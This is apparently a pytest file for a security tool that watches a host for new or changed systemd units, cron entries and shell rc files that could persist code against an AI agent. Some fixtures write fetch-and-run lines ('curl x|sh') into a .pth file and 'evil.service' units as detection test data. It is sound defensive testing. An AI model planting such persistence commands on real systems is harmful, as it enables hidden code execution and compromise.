"""F-179 — the watch looks at the machine, not only at the agent's settings.

`--monitor` was an honest watch of `openclaw.json` and of everything OpenClaw itself
writes. It was structurally blind to the host, and that blindness has a named consequence:
`docs/research/fourth-leg-persistence-2026-08-06.md` §2 row 3 records a **host scheduled
task** rewriting an identity file — Zenity Labs' demonstrated OpenClaw chain — under the
column "what stops it: *nothing in openclaw.json*".

Measured before the fix: `grep -c 'crontab\\|systemd\\|bashrc' clawseccheck/monitor.py` = 0.

**The severity split is the load-bearing design decision here, so it is pinned in both
directions.** A watch that pages on `pip install -e` gets switched off, and a switched-off
watch is 0% coverage — so a shell-rc MODIFICATION is INFO and must NOT move the exit code
at the cron recipe's `--fail-on medium`. A systemd unit or a system cron entry appearing or
changing IS above that line. (`.pth` files were a fourth family for one afternoon; the
C-135 pass removed them — `test_a_pth_file_is_not_a_watched_family` records why.) Tests assert the exit code, not just the text,
because the exit code is what actually decides whether a human is woken.

**The defect these tests exist to prevent recurring.** The first implementation passed
`ctx.home` to the scan. That is the OpenClaw state directory (`~/.openclaw`), not the
account's home, so the scan looked for `~/.openclaw/.config/systemd/user`, found nothing,
and returned 23 entries instead of 36 — no error, no warning, every home-rooted family
silently missing and a plausible number on the screen. `test_a_redirected_home_moves_the_scan`
and `test_the_scan_finds_home_rooted_families` are what make that loud.

Offline, read-only outside tmp_path, stdlib only.
"""
from __future__ import annotations

import io
import json
import os
import contextlib
from pathlib import Path

import pytest

from clawseccheck import hostpersist, monitor
from clawseccheck.cli import main
from clawseccheck.monitor import diff_with_notes

_MARK = "Startup/scheduling file(s)"
_UNREADABLE_MARK = "could not be read"


# --------------------------------------------------------------------- the leaf

def _host(root: Path) -> Path:
    (root / ".config/systemd/user").mkdir(parents=True, exist_ok=True)
    (root / ".config/systemd/user/openclaw-gateway.service").write_text(
        "[Service]\nExecStart=/usr/bin/openclaw gateway\n", encoding="utf-8")
    (root / ".bashrc").write_text("export PATH=$PATH:/usr/local/bin\n", encoding="utf-8")
    (root / ".profile").write_text("# nothing\n", encoding="utf-8")
    return root


def test_the_scan_finds_home_rooted_families(tmp_path):
    """The positive control. Every assertion below about silence is worthless if the scan
    simply never finds anything — which is exactly the state the `ctx.home` defect left it
    in."""
    result = hostpersist.scan(_host(tmp_path), system_cron_paths=(), user_cron_spools=())
    families = {e.family for e in result.entries}
    assert hostpersist.FAMILY_SYSTEMD in families, result
    assert hostpersist.FAMILY_SHELL_RC in families, result
    assert len(result.entries) >= 3, result


def test_a_redirected_home_moves_the_scan(tmp_path):
    """`--home` names the OpenClaw directory; the account's home is a different thing and
    the scan must follow the one it is given, not `Path.home()`."""
    a, b = _host(tmp_path / "a"), tmp_path / "b"
    b.mkdir()
    assert hostpersist.scan(a, system_cron_paths=(), user_cron_spools=()).entries
    assert not hostpersist.scan(b, system_cron_paths=(), user_cron_spools=()).entries


def test_the_scan_never_records_content(tmp_path):
    """ZKDS. A systemd unit is where B193 finds gateway credentials in the real world, and a
    shell profile is where people put `export API_KEY=`. Only digests may leave the leaf."""
    root = _host(tmp_path)
    secret = "s3cr3t-" + "value-in-a-unit"
    (root / ".config/systemd/user/openclaw-gateway.service").write_text(
        "[Service]\nEnvironment=TOKEN=" + secret + "\n", encoding="utf-8")
    blob = json.dumps(hostpersist.to_snapshot(
        hostpersist.scan(root, system_cron_paths=(), user_cron_spools=())))
    assert secret not in blob, blob


def test_no_entry_path_carries_the_account_name(tmp_path):
    """A drift baseline reaches the event journal and any report a user pastes into an
    issue. An absolute home path there names the user — `openclawdist.py` records the same
    rule for the same reason."""
    result = hostpersist.scan(_host(tmp_path), system_cron_paths=(), user_cron_spools=())
    for entry in result.entries:
        assert entry.path.startswith("~/"), entry
        assert str(tmp_path) not in entry.path, entry


def test_two_scans_of_an_unchanged_host_are_byte_identical(tmp_path):
    """The drift engine compares these directly. An unstable key order would fabricate a
    change on every single run — the B-269 shape arriving through a new door."""
    root = _host(tmp_path)
    kw = dict(system_cron_paths=(), user_cron_spools=())
    first = json.dumps(hostpersist.to_snapshot(hostpersist.scan(root, **kw)), sort_keys=True)
    second = json.dumps(hostpersist.to_snapshot(hostpersist.scan(root, **kw)), sort_keys=True)
    assert first == second


def test_an_unreadable_location_is_disclosed_not_dropped(tmp_path):
    """Absence is not evidence. On a real Linux box the user's own crontab spool is
    unreadable every run, and that is the closest on-disk analogue of the published attack
    — a silence there would read as 'nothing scheduled'."""
    spool = tmp_path / "spool"
    spool.mkdir()
    os.chmod(spool, 0o000)
    try:
        result = hostpersist.scan(_host(tmp_path), system_cron_paths=(),
                                  user_cron_spools=(str(spool),))
        assert str(spool) in result.unreadable, result.unreadable
    finally:
        os.chmod(spool, 0o700)


def test_a_missing_location_produces_no_disclosure(tmp_path):
    """The narrowness control. A path that does not exist on this platform is not a gap —
    reporting it would inflate the un-compared count until nobody reads it."""
    result = hostpersist.scan(_host(tmp_path), system_cron_paths=(),
                              user_cron_spools=(str(tmp_path / "nope"),))
    assert not result.unreadable, result.unreadable


def test_a_pth_file_is_not_a_watched_family(tmp_path):
    """The C-135 narrowing, pinned.

    A fourth family walked the running interpreter's `sys.path`, which made the dimension a
    function of HOW THE TOOL WAS INVOKED rather than of the machine. Running once from the
    system interpreter and once from a project virtualenv holding one ordinary
    `pip install -e` artefact produced a MEDIUM "appeared" and then an INFO "removed" on a
    host where nothing had changed — above the shipped cron recipe's threshold, in
    alternation, forever.

    A `.pth` dropped straight into the scanned home must therefore be invisible here. It is
    still examined by B99/B335 on every audit, and `checks` is itself a watched dimension,
    so the coverage moved channel rather than disappearing.
    """
    root = _host(tmp_path)
    (root / "evil.pth").write_text("import os; os.system('curl x|sh')\n", encoding="utf-8")
    (root / "sitecustomize.py").write_text("import os\n", encoding="utf-8")
    result = hostpersist.scan(root, system_cron_paths=(), user_cron_spools=())
    assert "python_autoexec" not in {e.family for e in result.entries}
    assert not [e for e in result.entries if e.path.endswith((".pth", "sitecustomize.py"))]
    assert hostpersist.FAMILY_PYTHON_AUTOEXEC not in hostpersist.FAMILIES


# ------------------------------------------------------- the dimension's classification

def test_the_dimension_is_registered_and_conditional():
    assert "host_persist" in monitor.WATCHED_DIMENSIONS


def test_it_is_in_neither_collapse_list():
    """The classification the task called out as the thing to get right.

    `_CONFIG_DIMENSIONS` collapse when `openclaw.json` cannot be read — wrong here, since an
    unreadable config says nothing about `/etc/cron.d`. `_SHRINKABLE_DIMENSIONS` means
    "config can only ADD roots, so a shrink is a signal" — also wrong, because on the host a
    user deleting a unit and an attacker deleting one are the same edit.
    """
    assert "host_persist" not in monitor._CONFIG_DIMENSIONS
    assert "host_persist" not in monitor._SHRINKABLE_DIMENSIONS


def test_every_leaf_family_is_classified_for_severity():
    """A new family added to the leaf must be consciously placed on one side of the
    MEDIUM/INFO line. Without this, a new family silently lands on the INFO side and its
    modifications stop being able to wake anyone."""
    assert set(hostpersist.FAMILY_LABELS) == set(hostpersist.FAMILIES)
    assert monitor._HOST_PERSIST_INFRA <= set(hostpersist.FAMILIES)
    assert monitor._HOST_PERSIST_INFRA, "no family is infrastructure — the split collapsed"
    assert set(hostpersist.FAMILIES) - monitor._HOST_PERSIST_INFRA, "every family is infra"


# --------------------------------------------------------------------- the diff arm

def _snap(entries: dict, **kw) -> dict:
    base = {
        "version": monitor.SNAPSHOT_VERSION,
        "checks": {}, "graded": True, "score": 50, "raw_score": 50, "grade": "F",
        "scope": ["host"], "watched": list(monitor.WATCHED_DIMENSIONS),
        "config_ever_seen": True,
        "host_persist": {"entries": entries, "unreadable": [], "capped": False,
                         "families_seen": list(hostpersist.FAMILIES)},
    }
    base["host_persist"].update(kw)
    return base


def _e(family: str, digest: str) -> dict:
    return {"family": family, "digest": digest}


_UNIT = "~/.config/systemd/user/a.service"
_RC = "~/.bashrc"


def _alerts(prev, curr):
    alerts, _notes = diff_with_notes(prev, curr)
    return [(lvl, m) for lvl, m in alerts if _MARK in m]


def test_an_unchanged_host_says_nothing():
    """The false-positive floor. Without it every other assertion here is satisfied by an
    arm that always fires."""
    snap = _snap({_UNIT: _e(hostpersist.FAMILY_SYSTEMD, "a" * 8)})
    assert not _alerts(snap, _snap({_UNIT: _e(hostpersist.FAMILY_SYSTEMD, "a" * 8)}))


@pytest.mark.parametrize("family", list(hostpersist.FAMILIES))
def test_a_new_entry_in_any_family_is_medium(family):
    """An execution entry point that did not exist at the last check. This is the shape of
    the published attack, in every family."""
    prev = _snap({})
    curr = _snap({"~/new": _e(family, "b" * 8)})
    hits = _alerts(prev, curr)
    assert hits, family
    assert any(lvl == "MEDIUM" for lvl, _m in hits), hits


def test_a_modified_infrastructure_file_is_medium():
    """An `ExecStartPre=` added to an existing unit arms code just as surely as a new unit
    does, and these files change rarely enough to carry the severity."""
    prev = _snap({_UNIT: _e(hostpersist.FAMILY_SYSTEMD, "a" * 8)})
    curr = _snap({_UNIT: _e(hostpersist.FAMILY_SYSTEMD, "c" * 8)})
    assert any(lvl == "MEDIUM" for lvl, _m in _alerts(prev, curr))


def test_a_modified_shell_file_is_info_not_medium():
    """Every version manager appends to `.bashrc`; `pip install -e` writes a `.pth`. If
    these were MEDIUM the cron recipe would page on routine work and the watch would be
    turned off — which is the failure mode this calibration exists to avoid."""
    prev = _snap({_RC: _e(hostpersist.FAMILY_SHELL_RC, "a" * 8)})
    curr = _snap({_RC: _e(hostpersist.FAMILY_SHELL_RC, "c" * 8)})
    hits = _alerts(prev, curr)
    assert hits, "a shell-rc change must still be REPORTED, just not at paging severity"
    assert all(lvl == "INFO" for lvl, _m in hits), hits


def test_a_removal_is_info():
    prev = _snap({_UNIT: _e(hostpersist.FAMILY_SYSTEMD, "a" * 8)})
    hits = _alerts(prev, _snap({}))
    assert hits
    assert all(lvl == "INFO" for lvl, _m in hits), hits


def test_an_unreadable_location_becomes_a_note_never_an_alert():
    prev = _snap({})
    curr = _snap({}, unreadable=["/var/spool/cron/crontabs"])
    alerts, notes = diff_with_notes(prev, curr)
    assert not [m for _lvl, m in alerts if _UNREADABLE_MARK in m], alerts
    assert [s for _c, s in notes if _UNREADABLE_MARK in s], notes


def test_a_damaged_record_is_a_note_not_a_silent_skip():
    prev = _snap({})
    curr = _snap({})
    curr["host_persist"]["entries"] = "not a dict"
    _alerts_out, notes = diff_with_notes(prev, curr)
    assert [s for _c, s in notes if "not in the expected form" in s], notes


def test_an_absent_dimension_on_one_side_does_not_fabricate():
    """A baseline written before this dimension existed must not report the entire host as
    newly appeared on the first run after an upgrade."""
    prev = _snap({})
    del prev["host_persist"]
    assert not _alerts(prev, _snap({_UNIT: _e(hostpersist.FAMILY_SYSTEMD, "a" * 8)}))


# --------------------------------------------------------------------- end to end

def _run(user_home: Path, oc_home: Path, store: Path, *extra) -> "tuple[int, str]":
    buf = io.StringIO()
    previous = os.environ.get("HOME")
    os.environ["HOME"] = str(user_home)
    try:
        with contextlib.redirect_stdout(buf):
            rc = main(["--monitor", "--home", str(oc_home), "--data-dir", str(store), *extra])
    finally:
        if previous is not None:
            os.environ["HOME"] = previous
    return rc, buf.getvalue()


@pytest.fixture()
def bed(tmp_path):
    user, oc, store = _host(tmp_path / "user"), tmp_path / "oc", tmp_path / "store"
    oc.mkdir()
    cfg = oc / "openclaw.json"
    cfg.write_text(json.dumps({
        "gateway": {"bind": "127.0.0.1:8080",
                    "auth": {"mode": "token", "token": "a-very-long-token-of-32-chars!!"}},
    }), encoding="utf-8")
    os.chmod(cfg, 0o600)
    _run(user, oc, store)
    return user, oc, store


def test_end_to_end_a_new_unit_wakes_the_job(bed):
    user, oc, store = bed
    (user / ".config/systemd/user/evil.service").write_text(
        "[Service]\nExecStart=/bin/sh -c 'curl x|sh'\n", encoding="utf-8")
    rc, out = _run(user, oc, store, "--exit-code", "--fail-on", "medium")
    assert _MARK in out, out
    assert rc == 3, out


def test_end_to_end_an_appended_bashrc_does_not_wake_the_job(bed):
    """The everyday case, asserted on the EXIT CODE. The change is still reported on
    screen — it simply sits below the threshold the shipped cron recipe pages on."""
    user, oc, store = bed
    (user / ".bashrc").write_text(
        "export PATH=$PATH:/usr/local/bin\nexport NVM_DIR=$HOME/.nvm\n", encoding="utf-8")
    rc, out = _run(user, oc, store, "--exit-code", "--fail-on", "medium")
    assert _MARK in out, "the change must still be reported, just not at paging severity"
    assert rc == 0, out


def test_end_to_end_an_unchanged_host_is_silent(bed):
    user, oc, store = bed
    rc, out = _run(user, oc, store, "--exit-code", "--fail-on", "medium")
    assert _MARK not in out, out
    assert rc == 0, out


def test_end_to_end_the_host_is_watched_even_when_the_config_cannot_be_read(bed):
    """The arm is deliberately not gated on `compare_config`. A run that cannot read
    `openclaw.json` can still see the machine, and that is exactly when it matters most."""
    user, oc, store = bed
    os.chmod(oc / "openclaw.json", 0o000)
    try:
        (user / ".config/systemd/user/evil.service").write_text(
            "[Service]\nExecStart=/bin/sh\n", encoding="utf-8")
        rc, out = _run(user, oc, store, "--exit-code", "--fail-on", "medium")
        assert _MARK in out, out
        assert rc == 3, out
    finally:
        os.chmod(oc / "openclaw.json", 0o600)


def test_end_to_end_the_snapshot_carries_the_dimension(bed):
    _user, _oc, store = bed
    state = json.loads((store / "state.json").read_text(encoding="utf-8"))
    assert "host_persist" in state, sorted(state)
    assert isinstance(state["host_persist"].get("entries"), dict)
